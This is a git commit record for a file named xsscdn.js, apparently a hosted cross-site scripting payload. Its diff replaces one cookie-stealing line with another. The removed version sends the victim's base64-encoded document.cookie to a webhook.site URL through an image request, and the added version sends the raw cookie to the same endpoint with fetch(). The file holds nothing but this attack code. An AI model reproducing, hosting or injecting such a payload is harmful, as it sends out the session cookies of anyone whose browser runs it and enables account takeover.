1a23b7504c8bed17640edc6003e39e4efe5d2d2a
rooor404 <dzero1539@gmail.com>
2025-03-28 19:20:02 -0400

    Update xsscdn.js

--- xsscdn.js
+++ xsscdn.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/ca0b174c-f9ec-447a-9988-3a7f7ee80b21?
-data='+btoa(document.cookie);
+fetch('https://webhook.site/ca0b174c-f9ec-447a-9988-3a7f7ee80b21?cookie=' + document.cookie);
